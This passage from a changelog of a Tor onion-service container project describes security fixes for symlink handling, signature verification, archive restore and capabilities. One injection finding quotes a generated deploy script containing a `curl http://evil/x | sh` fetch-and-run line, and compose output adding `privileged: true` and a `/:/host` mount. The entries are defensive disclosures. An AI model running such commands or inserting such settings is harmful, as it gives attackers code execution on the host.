  lagged the in-container healthcheck. It now names the missing condition.
- **`vanity` failed inside docker on a key path containing `:`**, as
  "invalid mode: /keys". Refused up front with the reason.
- **`backup` could read through a key file swapped for a symlink** after its
  `is_symlink()` check. Key files are now read through `O_NOFOLLOW`.
- **CI's secret scan never looked at history** (`gitleaks --no-git`). It now
  scans every commit as well as the tree; the full history is clean.
- **`restore` and `decrypt-key` accepted a truncated key.** A member merely
  named `hs_ed25519_secret_key` counted as an identity, so an empty one restored
  with `ok: true`, and with `--force` would have moved the real key aside for it.
  Every such member must now be the 96-byte, tagged file Tor writes.
- **`doctor` could pass a service it never checked**, when the container's own
  report used a check name the host did not collect. A service nobody reported
  on is now a failure.
- **`status` blamed waiting for an inconsistent key set**; it now gives the
  inconsistency as the reason.
- Documentation corrected where it no longer matched the code: an `sbom`
  command that booted Tor instead, a `docker run` example with `-v` after the
  image name, "nothing stays root" (the supervisor does, with `0xc2`/`0xc0`), a
  pip pin that was removed in 2.1.0, arm64 described as never built (it now
  builds twice with identical digests), and a banner loaded from a third-party
  image host (now vendored, without its EXIF block).

### Fixed (second review, 2026-09-25)
An independent pass over the fixes below, each finding reproduced before it was
changed and re-reproduced independently.
- **`verify-image` trusted whatever keys arrived with the signatures.** The signer
  list was read from `<sigdir>/allowed-signers` and the ML-DSA key from
  `<sigdir>/sambent-mldsa.pub`, so a directory carrying a substituted key and a
  matching signature verified: a plain software ed25519 key labelled
  `sam@sambent.com` gave `ssh_fido2: true`, and with a forged ML-DSA key as well
  the result was a bare `VERIFIED`, `complete: true`. The two release signer keys
  and the SHA-256 of the ML-DSA key are now pinned in the CLI; `--allowed-signers`
  / `--mldsa-pub` name a different anchor explicitly and the result says so
  (`trust_anchor`). The earlier "stripped ML-DSA" fix below addressed a symptom
  of this; the cause was the missing anchor.
- **`verify-image` exited 0 with half the hybrid signature unexamined.** With
  both ML-DSA files deleted, or no `pqsign` installed, only the JSON `complete`
  field said so. It now exits 1 unless `--allow-classical-only` is passed, and
  `--skip-registry` is reported as `complete: false`. The digest file is read
  once and the same bytes feed all three checks; it used to be read three times.
- **`decrypt-key` overwrote a live key set.** It extracted straight over
  `<keys>/<name>/` with no `--force` and no copy kept (the flag was parsed and
  ignored), so decrypting an old envelope after the service had a new key
  destroyed the live identity; and file-by-file overwriting could leave a mixed
  key set. It now refuses a non-empty directory, and with `--force` moves it
  aside whole and extracts into a fresh one. It also shares `restore`'s archive
  validation, which it had drifted from (it skipped what restore refused, never
  checked names for control characters, and accepted a keyless archive).
- **The container could refuse to start with a false "Tor is running as root".**
  `_assert_process_dropped` read the child's uid right after `Popen`, when the
  child is still `su-exec`, which is root until its own `setuid()`. Measured: 294
  of 300 reads in the image saw `su-exec` at uid 0, and 4 of 16 concurrent
  rootless starts died. Uid 0 is now "not yet" while the process is `su-exec`,
  and still fatal once it is Tor. Not in any release.
- **`show` printed an address Tor would not serve.** With a `hostname` file that
  disagreed with the public key it reported the file's address, exit 0.
  Measured in the image: Tor rewrites `hostname` from the key at startup. `show`
  now exits 1, reports no address (`source: "inconsistent"`), and carries both
  as `hostname_onion` / `derived_onion`.
- **A replaced key left its old published address behind.** `restore`,
  `decrypt-key` and `vanity --force` now remove `<name>.onion` for each key they
  replace; from the host, `show` falls back to that file and would have reported
  the old address as current.
- **`restore` created directories for archives it then refused**, from its
  conflict scan; and its final pass chmod'ed every entry in the volume by path,
  resetting unrelated published `<name>.onion` files from 0644 to 0600. Archives
  are now validated before the volume is touched, the scan creates nothing, and
  modes are set only on what restore wrote, through descriptors.
- **`setup` still emitted two unquoted command lines**: `README.txt`'s
  `hiddenforge show --keys ...` and `hiddenforge.json`'s `merge`/`bare_command`
  (with `--out`). Both are now shell-quoted.
- **The image could not be built.** Alpine pruned `tor=0.4.9.12-r0`; pinned to
  `0.4.9.13-r0`, the version the index carries.
- **The curated mutation check reported kills that never ran a test.** Targets
  were split on whitespace, so `-k image_ref or validate_image` handed pytest the
  paths `or` and `validate_image`; it exited 4 ("file not found") and any
  non-zero exit counted as a kill. Only exit 1 is a kill now, and it rewrote the
  real source files during a run (a concurrent build captured a mutant); it now
  works in a throwaway copy. It gained curated mutations for every guard above
  and for earlier fixes it did not cover.
- `docs/THREAT-MODEL.md` said the CLI never reads or hashes the secret key;
  `backup` and `--delete-plaintext` do both. Corrected, with what each does.

### Fixed
- **`restore` reported success over an archive holding no identity.** An archive
  that decrypted but carried no `hs_ed25519_secret_key` and no encrypted key
  envelope produced `ok: true` and an empty key volume. That is the worst answer
  this command can give: the operator reads success, believes the identity is
  back, and the only remaining copy may be the one they are about to delete. A
  .onion address IS its key and there is no reissuing it. Now refused before
  anything is written, so a bad archive cannot half-populate the volume either.
  The envelope case is covered deliberately, with a round-trip test, because a
  volume encrypted with `--delete-plaintext` holds no plaintext key and refusing
  to restore THAT would have been the worse bug.
- **`restore` accepted control characters in archive member names.** The archive
  is the one input channel that reaches the key volume without passing the name
  validation `--keys` and `--name` both get, and these names become directories
  and are printed back by `show`, `status` and `doctor`. A newline splits a line
  of operator output in two; an ESC sequence rewrites the terminal it is printed
  to. Refused with the same rule `validate_keys_dir` applies.
- **The healthcheck's `process_up` was the constant `true`.** `manifest.json`
  advertises it to integrators beside fields that do mean something, and it read
  as a statement about the Tor process while being documented as "always true if
  this executes". Measured against the image: a container with no Tor in it at
  all reported `process_up: true`. It now matches the daemon on argv[0], which a
  running container says is the bare name `tor` rather than an absolute path --
  checked rather than assumed, because matching `/usr/bin/tor` would have made
  the field permanently false on a healthy service. Vanguards runs with
  `--control_socket /var/lib/tor/control.sock`, so a looser substring test finds
  the addon and calls it the daemon; there is a test for that too.
- **The capability drop failed entirely under rootless Podman.** `capset`
  refuses a permitted set that is not a subset of the current one, and the
  supervisor asked to keep `DAC_OVERRIDE|SETUID|SETGID` unconditionally. This
  project's own `podman-compose.yml` deliberately withholds DAC_OVERRIDE, so the
  call was refused and **nothing was dropped**: the supervisor kept CHOWN for the
  life of the container, on the runtime the deployed instance actually runs.
  Reproduced from the shipped file, which logged "could not drop setup
  capabilities: Operation not permitted". The request is now narrowed to what the
  runtime granted, so the drop succeeds and CHOWN goes; measured afterwards, the
  Podman supervisor holds `0xc0` (SETGID, SETUID) where it used to hold CHOWN as
  well, and Docker is unchanged at `0xc2`.
- **`verify-image` reported `ok: true` for an image it had only half checked.**
  The human output has always said VERIFIED, BUT NOT COMPLETELY when the ML-DSA
  half could not be checked, while the JSON offered only `ok`, which means
  "nothing that ran failed". A deploy gate keying on it ships an image whose
  post-quantum signature was never verified because `pqsign` happened not to be
  installed on the runner -- signature-stripping arriving through the verifier's
  reporting rather than through the signature. The document now carries
  `complete`, and `docs/INTEGRATION.md` says to gate on `ok and complete`.
- **The CI `build-and-test` job failed on its second run on a self-hosted
  runner.** The vanity smoke test wrote to a fixed `/tmp/hf-keys`, which survives
  between jobs there, so the next run found the previous run's key and `vanity`
  refused it -- correctly, since a key IS the address. The job then failed for a
  reason that had nothing to do with the commit. It now uses a fresh directory
  per run and removes it; passing `--force` instead would have suppressed exactly
  the refusal worth keeping. The four CI venvs are created with `--clear` for the
  same reason: on a persistent runner a package dropped from the lock file
  otherwise stays installed.
- **PyYAML was in no CI requirement file, so the container-escape guard skipped.**
  The two tests that prove a crafted `--keys` or `--container` cannot smuggle
  `privileged: true` or `/:/host` into the operator's compose file work by
  PARSING the output, and they called `pytest.importorskip("yaml")`. In CI the
  parser was absent, both skipped, and the suite reported green having checked
  nothing. Caught by the mutation spot-check, which reported the container-escape
  mutation SURVIVED in CI while it was killed locally. PyYAML and its stubs are
  now pinned with hashes in `requirements-ci.txt`, and the two tests raise
  instead of skipping if it ever goes missing again.
- **A hostname file was sanitised, then published.** `_publish_addresses` decoded
  with `errors='ignore'`, which deletes any non-ASCII byte and matches what is
  left: a `hostname` holding one stray byte beside a valid address published an
  address that was not what the file said. Now decoded strictly (inside a guard,
  because an escaping `UnicodeDecodeError` would kill the supervision loop) and
  skipped if it is not clean ASCII.
- **`vanity.py` exited 2 for a lost race, not the documented 3.** `manifest.json`,
  `hiddenforge info` and the module's own docstring all say exit 3 means "a key
  appeared at the output path while a search was running". `main()` caught
  `FileExistsError` and returned 2, "usage, validation, or environment error",
  sending an automated caller to the wrong remedy. Now a `KeyRaceError`
  (a `FileExistsError` subclass, so existing callers still catch it) with its own
  arm returning 3.
- **`vanity._harden` could have its chmod redirected by a symlink.** It tested
  `p.is_symlink()` and then chmod'ed by path, which re-resolves the name. Every
  mode and owner is now set with `fchmod`/`fchown` on an `O_NOFOLLOW` descriptor,
  including the key directory itself, matching what `entrypoint.py` already did.
- **`_write_dropped_mappings` chowned by path and left its mode to the umask.**
  Now `fchown` on the descriptor it wrote through, and an explicit `fchmod(0o600)`
  so the mode is a guarantee rather than a request the umask happens to narrow.
- **`--container` was injectable into the compose fragment and `deploy.sh` too.**
  The same hole as `--keys`, one interpolation over, in the same file: the
  container name becomes a YAML key, so a crafted value put `privileged: true` on
  the tor service and added a second service beside it. Found by auditing every
  interpolation in both generators rather than only the one a mutant pointed at.
  It is now validated with the `validate_container` that already existed, quoted
  for the shell, and `--onion-port` is range-checked at `setup` time instead of
  producing a compose file whose service the container silently drops at boot.
- **`show` reported an address the container would not serve.** `address_for`
  returned whatever the `hostname` file said without ever comparing it to the
  public key, which IS the address. A key set assembled from two services, or a
  partial restore, therefore produced an address the operator would publish while
  Tor, which rewrites `hostname` from the key at startup, served a different one.
  The document now carries `derived_matches` (`true`/`false`/`null` for "could
  not tell"), `onion` and `source` are unchanged so the contract holds, and
  `doctor` fails a key set whose two halves disagree.
- **`doctor` failed the capability check on this project's own
  `podman-compose.yml`.** It demanded all five capabilities on every runtime,
  while that file deliberately grants three: under rootless Podman container root
  maps to the invoking host user, so the bind-mounted key volume is already
  writable and neither DAC_OVERRIDE nor FOWNER is needed. The deployed instance
  runs podman, so the recommended configuration reported FAILED. The requirement
  is now runtime-aware, and rootlessness is asked of the engine rather than
  assumed, with any unclear answer leaving the strict set in force.
- **The `--keys` path was injectable into both files `setup` generates.**
  `--image` and `--container` were validated and this was not. A crafted value
  produced a `compose.service.yml` carrying `privileged: true` and `/:/host` --
  a container escape in a file the operator merges with their own compose.yml --
  and a `deploy.sh` (written 0755, and the README tells them to run it)
  containing `curl http://evil/x | sh`. Both reproduced. The YAML scalar is now
  emitted with `json.dumps`, the shell path with `shlex.quote`, and
  `validate_keys_dir` refuses control characters. The golden files moved by
  exactly two lines, both the new quoting.
- **`verify-image` printed VERIFIED for an image whose post-quantum signature had
  been stripped.** The ML-DSA verdict is tri-state and only `False` counted as a
  failure, so deleting `sambent-mldsa.pub` from a signature directory downgraded
  the hybrid scheme to a single classical signature in silence. One half present
  without the other is now a failure; a set that genuinely has no post-quantum
  half, or a machine without `pqsign`, is reported as NOT CHECKED (a new
  `unchecked` field in the JSON, and `VERIFIED, BUT NOT COMPLETELY` on the human
  line).
- **`encrypt-key --delete-plaintext` destroyed the only copy of an onion identity
  without verifying the archive.** It wrote the ciphertext and immediately
  `rmtree`d the plaintext, on the strength of gpg's exit status. It now reads the
  file back, decrypts it and compares SHA-256 against the tar it encrypted before
  removing anything, `fsync`s the write, and refuses to delete at all when the
  read-back cannot be made (age decrypts only from a TTY). Every other destructive
  path in this project archives rather than deletes; this was the exception, on
  the one artifact whose loss is permanent.
- **`decrypt-key` had `restore`'s destination traversal too** and is fixed the
  same way.
- **`restore` followed a symlinked directory that was already in the key volume.**
  It refuses archive members that are symlinks and names that are absolute or
  contain `..`, all of which are about the ARCHIVE. A destination volume already
  holding `app -> /somewhere/else` turned the member `app/hs_ed25519_secret_key`
  into a write outside the volume; `O_NOFOLLOW` on the final component does not
  help when the traversal is in its parent. Reproduced, then fixed: the volume is
  opened `O_DIRECTORY|O_NOFOLLOW` and every component, the conflict scan, the
  archive-aside rename and the extraction are now descriptor-relative.
- **The key-volume size budget was checked after the file was read.**
  `_tar_keys` in `scripts/hiddenforge` did `data = path.read_bytes()` and only then
  compared the running total against its 512 MB limit, so one oversized file was
  already in memory before the guard ran. It walks an operator-supplied volume the
  threat model allows to have been restored from untrusted media. Now it asks
  `stat()` first.
- **`tests/test_subprocess_timeouts.py` read the mutated source tree**, so it
  failed on an unmutated baseline and aborted mutmut's statistics pass (`-x`).
  With no statistics every mutant maps to zero tests, which is exactly the
  "787 generated, 0 checked" artifact. It now uses `loader.repo_root()`.

### Added
- **`scripts/mutation_gate.py`**: reads `mutmut results` and fails unless every
  surviving mutant is in an allowlist with a written reason. Mutants are keyed on
  their diff rather than mutmut's positional name, which renumbers on any edit.
- **A `mutation` CI job** (tag and daily schedule only, twenty minutes and more) running the
  full pass and the gate, with its own hash-pinned venv
  (`requirements-mutation.txt`): mutmut pulls in thirteen packages the lint and
  unit jobs have no reason to trust.
- **Tests for four surfaces that had none.** `healthcheck.py` and the
  `vanity.py` generator path had no unit tests at all; `_drop_setup_capabilities`
  and `_service_reachable` had no test touching any of their mutants, including
  the one that inverts the publication gate. Also `dispatch_subcommand`'s
  privilege decision, `generate_basic_torrc`, `wait_for_socket`,
  `start_vanguards`, and the whole startup sequence of `main()`.
- **`tests/fake_mkp224o.py`**, a stand-in that speaks the real generator's command
  line and writes a real Tor key directory from the published test vector, so
  `vanity.py`'s refusals are exercised rather than mocked.

### Changed
- `entrypoint.py` names `KEYS_ROOT`, `TORRC_PATH` and `DATA_DIR` once instead of
  spelling the same two paths out six times, and `healthcheck.py` names
  `PROC_ROOT`. These were what made `generate_basic_torrc` and
  `_vanguards_running` untestable outside a container.
- `tests/conftest.py` runs every test from a throwaway working directory, and
  `tests/loader.py` gained `source_path()` so a test loads the copy of a module
  that mutmut actually mutated. Without it, `vanity.py`'s 772 mutants would all
  have survived while the report called the file tested.
- `scripts/mutation_spotcheck.py` is re-scoped to `scripts/hiddenforge`, the one
  file mutmut cannot mutate (no `.py` extension), and its docstring withdraws the
  claim that mutmut's full run was unreliable here. It was not: the run was being
  started with `python -m mutmut`, which re-imports `mutmut.__main__` from inside
  the injected trampoline and dies on `set_start_method`.

---

### Earlier 2.1.0 work (completed 2026-09-11)

Machine-first adoption: hiddenforge can now be integrated by a program, and the
vanity generator ships inside the image. Everything below is additive; the
existing `docker compose up -d` human path is unchanged.

### Added
- **`hiddenforge` operator CLI** (`scripts/hiddenforge`, stdlib-only): `setup`,
  `info`, `version`, `show`, `status`, `doctor`, `vanity`, `backup`, `restore`,
  `rotate`, `encrypt-key`, `decrypt-key`. Every command that matters supports
  `--json`, prints exactly one JSON document on stdout (narration on stderr),
  never prompts off a TTY, and uses the documented exit codes
  (`0/1/2/3/4/130`).
- **`setup` emits a mergeable fragment** (`compose.service.yml`) plus `deploy.sh`,
  `README.txt`, and `hiddenforge.json`, so a consumer runs
  `docker compose -f their.yml -f compose.service.yml up -d` without editing our
  files. `--backend service:port --name name` is the simple form; the native
  `{NAME}_TOR_SERVICE_HOSTS` is unchanged. `--image` is configurable, so no host
  is hard-coded.
- **`manifest.json`** (checked in and shipped in the image): name, version,
  contract version, image reference, env contract, ports, volumes (with
  `contains: ["keys","address"]`), tmpfs, health states and `ready_field`, the
  address command and file paths, key formats/modes, and exit codes.
  `info --json` prints the same bytes; `version --json` reports
  `contract_version`. A test asserts the file and the code cannot drift.
- **mkp224o is vendored and built into the image** (multi-stage, statically
  linked, SHA256-verified archive; CC0-1.0). `hiddenforge vanity --prefix p
  --name n` runs headless, writes a Tor-native key set, refuses to overwrite
  without `--force` (archiving instead of deleting), and never prints key
  material. `--bench` measures throughput and prints the difficulty table
  (`32^length`) for prefixes 1..8. A test proves the generated `.onion` starts
  with the requested prefix and that the address re-derives from the public key.
- **Programmatic address discovery**: the entrypoint publishes a world-readable
  `<keys>/<name>.onion` as soon as Tor writes the key, so a consumer can read the
  address from the mount with no docker exec and no hiddenforge installed.
  `show --json --name n` returns `onion`, `key_path`, and `name`.
- **Granular readiness**: `healthcheck.py --json` distinguishes `process_up`,
  `tor_bootstrapped`, `hidden_service_published`, and `vanguards` (Vanguards is
  the guard-protection addon; its loss is otherwise invisible with
  `logging: none`). `status --json` exposes the same plus `ready`, and never
  reports ready before the address exists.
- **Full key lifecycle, scriptable**: `backup`/`restore` (age preferred, gpg with
  AEAD; `openssl` refused for creation because it is unauthenticated), `rotate`
  requiring `--confirm ROTATE`, and `encrypt-key`/`decrypt-key`. Destructive
  operations archive rather than delete. Documented: the key IS the address and
  loss is permanent.
- **`doctor`** verifies the running container's hardening (caps, `cap_drop ALL`,
  `no-new-privileges`, read-only rootfs, seccomp not unconfined, AppArmor,
  `pids_limit`, swap disabled, no published ports) plus on-disk key modes, and
  has a `--keys-only` mode for use inside the container.
- **In-image CLI dispatch**: `docker run <image> show|vanity|doctor|...` runs the
  operator tools instead of booting Tor, so `docker pull` is the only install
  step.
- **`examples/demo`**: a throwaway nginx app published as a `.onion` by adding
  only the emitted fragment.
- **`docs/THREAT-MODEL.md`**: the in-repo threat model, with every control
  mapped to where it lives in the code, the accepted trade-offs (root at PID 1,
  L2-only guard pinning, no at-rest encryption), and the
  commands that check each claim.
- **`docs/PRODUCTION-READINESS.md`**: the checklist of claims that had to be
  proven (reproducible build, multi-service, shipped compose, sbom,
  verify-image, arm64, image scan, in-image CLI), with the evidence for each.
- **A libFuzzer target** (`fuzz/fuzz_parsers.py`) for the untrusted parsers, run
  by `atheris`: the entrypoint validators, the CLI's
  image-reference and mapping parsers, `derive_onion`, and the torrc injection
  property at byte level. It imports the project modules under
  `atheris.instrument_imports()` so the fuzzer gets real edge coverage rather
  than fuzzing blind.
- **Multi-service `setup`**: `--service name:onionport:host:port` is repeatable,
  so several onions are emitted at once (each with its own env var, key
  directory, and address). `--runtime podman` emits a Podman-correct fragment
  and deploy script; `--force` is required to overwrite an existing output
  directory.
- **CI for the Forgejo instance** (`.forgejo/workflows/ci.yml`, the Forgejo-native
  path): lint (hadolint, ruff, `py_compile`), host unit + property tests with the
  coverage floor, and a build job that runs the in-container torrc test, the CLI
  contract checks, a vanity smoke test, and the live acceptance suite. It targets
  the self-hosted runner labelled `docker` (compute is local). Publishing the image to
  `sambent.dev` and signing it remain separate, deliberate local steps.
- **A working self-hosted runner**: Forgejo runner v13.1.0, SHA256-verified,
  registered to `sambent.dev` with host-mode labels `docker`/`ubuntu-latest`,
  so a push actually executes the CI. Actions are enabled for the repository.
  How CI runs: [docs/CI.md](docs/CI.md).
- **Podman parity in the CLI**: `status`, `doctor`, and `vanity` use `docker` or
  `podman` (whichever is present; override with `HIDDENFORGE_ENGINE`), and
  container lookup also understands podman-compose's service label.
- **Golden snapshots** for the emitted `compose.service.yml`, `deploy.sh`, and
  `README.txt`, so the integration contract cannot drift silently.
- **`verify-image` and `sbom`**: `verify-image` resolves the registry digest with
  `skopeo`, compares it to `signatures/hiddenforge.digest`, and verifies the
  SSH-FIDO2 (and ML-DSA, when `pqsign` is present) signature; `sbom` runs a
  digest-pinned `anchore/syft` and writes normalised SPDX JSON. Both support
  `--json`.
- **`dropped_mappings` visibility** (i2pforge parity): the entrypoint records a
  reason for every skipped or dropped service/mapping in
  `/var/lib/tor/dropped-mappings`, and `status --json` surfaces it as
  `dropped_mappings`. A typo that silently removed a service before is now
  visible from one command.

### Changed
- **Refreshed the `tor` apk pin `0.4.9.11-r0` to `0.4.9.12-r0`.** Alpine pruned
  `0.4.9.11-r0` from the 3.23 index, so the image could not be built from source
  at all (the same failure mode documented for 2.0.2 and 2.0.4).
- The key volume remains `0751` (traverse, not list). Because that means neither
  the host user nor the `tor` user can enumerate it, `show`/`doctor` fall back to
  the in-container healthcheck and the torrc for service names; the CLI never
  regresses the 2.0.4 decision to withhold the service list.

### Fixed
- `emit_json` no longer drops null fields, so a polling consumer can tell
  `onion: null` (not generated yet) from a missing key.
- `status`/`doctor` now resolve Docker Compose service labels, so
  `--container tor` works when the real container is `<project>-tor-1`.
- Operator-supplied env values are escaped before being echoed at startup, so a
  value containing ANSI escapes or newlines cannot forge log lines.
- **A missing crypto tool now gives host-specific guidance inside the image.**
  `backup`/`restore`/`encrypt-key`/`decrypt-key` need `age` or `gpg`, and the
  image deliberately ships neither; the error used to say "install" something
  into a read-only image. It now says to run the command on the host.
- **`ruff` was not linting the CLI at all.** `scripts/hiddenforge` has no `.py`
  extension, and `ruff check .` silently skips it, so the largest file in the
  project was unlinted in CI. CI now runs `ruff check . scripts/hiddenforge`, the
  ruleset is widened (RUF/PLW/SIM/PERF as well as E/F/W/B/S/UP), and the findings
  are fixed. `mypy` errors in the CLI (5) are fixed too.
- `HEALTHCHECK` uses the exec form instead of shell form (hadolint DL3025), and
  the `# nosec` comment that made bandit parse its own explanation as test names
  is cleaned up.
- **The shipped compose files could stop Tor from starting on a busy host.**
  Both set `ulimits.nproc: 256`. RLIMIT_NPROC is counted per **host** uid, and
  the tor user is uid 100 -- shared with other containers (i2pforge's i2pd is
  also uid 100). On a host already running >=256 threads as uid 100, `su-exec`'s
  `setuid()` fails with EAGAIN and Tor never starts; with `logging: driver: none`
  the only symptom is a silent restart loop. Reproduced live (uid 100 at 366
  threads): the old file never published an address, the fixed file publishes in
  6 seconds. `nproc` is removed from both compose files -- the generated fragment
  never set it -- `pids_limit` remains the per-container cap, and the entrypoint
  now probes `su-exec tor true` at startup and fails with a named error instead
  of looping.
- **The CLI validates image references.** `--image` / `--syft-image` were handed
  to `docker run` as argv and interpolated into the generated compose YAML, so a
  value beginning with `-` would be parsed by docker as a flag (`--privileged`)
  and one containing a newline would inject YAML keys. `validate_image_ref`
  rejects both, with tests for the flag and YAML cases.
- **The CI workflow is fail-closed for fork pull requests.** The runner is
  host-mode (jobs run as the operator), so a fork PR would otherwise get host
  code execution; every job now runs only for a push or a same-repository PR, and
  is skipped if the context cannot prove it.
- **A non-UTF-8 byte in an environment value could abort startup.** Such bytes
  decode to lone surrogates, and printing or writing one raises
  `UnicodeEncodeError`; it took down `build_torrc_string` at its own error log
  line, so one odd byte in `*_TOR_SERVICE_HOSTS` stopped the container from
  starting. Found by the libFuzzer target. Every message, validator error and
  dropped-mapping reason now escapes the raw value.
- **OpenSSL pinned to 3.5.8-r0.** Scanning the built image found 20 CVEs in the
  OpenSSL the base digest ships (3.5.7-r0), 2 of them HIGH. The HIGH ones are
  QUIC-server issues and Tor speaks no QUIC, so they were not reachable -- but the
  image should not ship a knowingly vulnerable TLS stack. `openssl=3.5.8-r0` is
  now pinned explicitly in the apk install rather than inherited from the base,
  and `trivy image` reports the image clean.
- **Vanguards is now retried when it never started.** The supervisor previously
  only restarted it after an observed exit, so a `wait_for_socket` timeout or a
  raise on the first start left the addon permanently absent (healthcheck
  unhealthy, no recovery short of a container restart). It is now retried with a
  bounded budget and a backoff; a missing control socket does not consume the
  budget.
- **`doctor` verifies the generated torrc** still contains every hardening
  directive (`ClientOnly 1`, `SafeLogging 1`, `VanguardsLiteEnabled 1`, PoW,
  Intro-point DoS, ...), not just the Docker flags and on-disk key modes.

### Tests
- Host suite 169 → 245 tests: CLI contract, manifest equality, Tor v3 address
  derivation against a real mkp224o-generated vector, name/traversal rejection,
  compose-fragment emission, key modes, backup/restore round-trip (including
  fail-closed wrong passphrase).
- Live acceptance suite (`HIDDENFORGE_E2E=1`): validates the emitted fragment with
  `docker compose config`, publishes the demo app and asserts the address file
  parses and matches `show --json`, reaches `status.ready`, and runs a vanity
  search whose result matches the prefix.

---

## [2.0.5] - 2026-08-22 (tagged; no image was published)

### Security
- **The Tor config is written through an `O_NOFOLLOW` descriptor**, and its mode
  and ownership are set with `fchmod`/`fchown` on that same descriptor. `open('w')`
  follows symlinks and the follow-up `chmod`/`chown` took a path, so a process able
  to write into the `/etc/tor` tmpfs before the entrypoint ran could have root
  truncate, chmod and chown an arbitrary file. Confirmed against 2.0.4: a symlinked
  `torrc` had the configuration written through it and the target transferred to the
  `tor` user. It now fails loudly instead.

  Reachability is low (the tmpfs starts empty and the entrypoint runs as PID 1),
  so this is defence in depth rather than an urgent fix, but it is the same class of
  issue already closed for the hidden-service key directory.

- **The resolver's answer is re-parsed** through `ipaddress.IPv4Address` before it
  can reach the config. CPython builds that string with `inet_ntop` from a 4-byte
  struct, so a hostile DNS server cannot smuggle whitespace or a newline through it;
  this is not a reachable injection. It is, however, the only value written to the
  torrc that the entrypoint neither constructs nor validates, and enforcing the
  invariant locally means a future change of resolver cannot silently reintroduce
  the gap.

- **Two environment variables can no longer collapse into one hidden service.**
  Service names are lowercased and underscores become hyphens, so
  `MYAPP_TOR_SERVICE_HOSTS`, `myapp_TOR_SERVICE_HOSTS` and
  `MY_APP_TOR_SERVICE_HOSTS` all resolve to the same directory, and environment
  variable names are case-sensitive, so all of them can be set at once. The
  generator emitted a `HiddenServiceDir` block per variable, and Tor rejects a
  duplicated directory outright: `Another hidden service is already configured
  for directory ...` → `Reading config failed`. Confirmed live against 2.0.4: the
  container never starts, taking down every other onion with it. Colliding names
  are now skipped with an explicit error naming both variables, matching how a
  service with no valid ports is handled.

- **A failed Vanguards addon is no longer invisible.** The supervisor restarts
  Vanguards up to five times and then continues with Tor alone, printing a
  warning to stdout, which the shipped compose file discards
  (`logging: driver: none`, so no host-side record of onion activity exists).
  The container therefore kept reporting **healthy** while bandguards and
  rendguard, both of which exist to detect an attack in progress, were gone.
  The healthcheck now also verifies the addon is alive, so the degradation shows
  up in `docker ps`: the one channel that survives a disabled log driver.
  Verified by exhausting the restart budget: 2.0.4 reports `healthy`, this
  release reports `unhealthy` with the reason.

### Added
- Tests covering resolver **output** rather than only user input: unusable answers
  drop the mapping, whitespace-padded ones normalise, and nothing outside the
  allowed directive set can appear regardless of what comes back, plus service-name
  collision coverage. Suite: 145 → 169.
- Documentation of a long-standing operational trap: backend hostnames are resolved
  **once**, at startup, and the resulting IP is baked into the torrc. Recreating the
  backend container gives it a new IP and the onion then blackholes silently, with
  nothing logged. Restart the Tor container after recreating a backend.

### Unchanged (deliberately)
- A Tor process that exits **on its own** is still reported as a failure, including
  when its own exit code was 0. Measured: `restart: unless-stopped` restarts on any
  exit status, so passing 0 through prevents no restart loop, while under
  `restart: on-failure` it would leave a dead onion inside a container that reports
  success. An orderly shutdown already exits 0 via the signal handler.

---

## [2.0.4] - 2026-08-18

### Security
- **Python runtime patched** (`python3` apk `3.12.13-r0` → `3.12.14-r0`), clearing
  six HIGH CVEs Alpine disclosed against the version 2.0.3 shipped:
  `CVE-2026-11940`, `CVE-2026-15308`, `CVE-2026-3644`, `CVE-2026-4786`,
  `CVE-2026-6100`, `CVE-2026-7210`. None of the affected modules are on this
  image's attack surface (it runs only the entrypoint, the healthcheck and
  Vanguards/stem, none of which parse untrusted XML or HTML, extract tarballs,
  handle HTTP cookies, or open a browser), but a Tor hidden service should not
  ship a knowingly vulnerable runtime. Trivy reports the image clean at every
  severity.

- **`VanguardsLiteEnabled 1` is now pinned in the generated torrc.** The full
  Vanguards addon's layer-2/3 guard pinning cannot be used in this image: it
  applies guard sets via `SETCONF`, which Tor's seccomp sandbox rejects
  (`Failed to configure rendezvous options`). vanguards-lite is therefore the
  only guard-discovery defence present, and Tor's `auto` default delegates it to
  the `vanguards-lite-enabled` consensus parameter, placing the last line of
  defence against guard-discovery attacks under the directory authorities'
  control rather than the operator's. Pinning it locally removes that lever.

- **Privileged startup no longer follows symlinks out of the key directory.**
  The entrypoint runs as root over the operator-supplied `./tor-keys` bind mount
  and used `os.chown()`, which follows symlinks: an arbitrary-chown primitive
  for anyone able to write to that volume (a restored backup, untrusted media, a
  second host user). On the previous image a symlink placed in the key directory
  transfers `/etc/tor` to the `tor` user, which would let a compromised Tor
  process rewrite its own configuration and persist. All privileged filesystem
  operations now refuse symlinks (`follow_symlinks=False`,
  `os.walk(followlinks=False)`, and `O_NOFOLLOW` descriptor-based chmod, as Linux
  has no `lchmod`).

- **Hidden-service parent directory tightened `0755` → `0751`.** Tor needs only
  the traverse bit to open a service directory by path; the read bit additionally
  allowed any non-owner process in the container to enumerate the names of every
  configured hidden service.

### Fixed
- **A single misconfigured service no longer takes down every other service.**
  When all of a service's port mappings failed validation, the entrypoint logged
  "Skipping invalid mapping" and still emitted a `HiddenServiceDir` with no
  `HiddenServicePort`, a state in which Tor refuses to start at all
  (`Hidden service ... with no ports configured` → `Reading config failed`). One
  typo therefore killed every onion in the container while the logs implied
  graceful degradation. Such services are now dropped with an explicit error and
  no key directory is created for them.

- **The in-image smoke test is non-destructive.** `tests/test_torrc.py` ships in
  the image and its docstring directs you to run it inside the container, where
  it called the privileged `generate_basic_torrc()`, overwriting the running
  `/etc/tor/torrc` and creating a stray hidden-service directory in the
  operator's key volume. It now exercises the pure `build_torrc_string()`, which
  has no filesystem side effects, and asserts that it created nothing.

- **Reading your `.onion` address works under rootless Podman.**
  `podman-compose ... exec tor cat .../hostname` failed with `Permission denied`,
  because that compose file correctly drops `DAC_OVERRIDE` and the exec'd root
  cannot traverse the `0700` tor-owned DataDirectory. Documented as
  `su-exec tor cat ...`, with a warning not to work around the error by re-adding
  the capability or loosening the key directory.

- **Build restored.** Alpine pruned the pinned `python3=3.12.13-r0` from the 3.23
  index when the security update landed, so `apk add` failed and the image could
  not be built from source at all.

### Changed
- **Published to the maintainer's own registry as well as Docker Hub**
  (`sambent.dev/sam/hiddenforge` and `doingfedtime/hiddenforge`). Both serve the
  identical digest and the same signatures verify either, so the mirror cannot
  serve different bytes under the same tag without detection.

- **Reproducible builds are now genuinely reproducible**, and the requirements are
  documented in `signatures/README.md`. Two things break bit-for-bit
  reproducibility and both are now handled: release images are built with
  `--provenance=false`, because buildx embeds wall-clock timestamps in the SLSA
  provenance attestation and that attestation lives inside the image index; and
  releases are built from a pristine checkout, because `rewrite-timestamp`
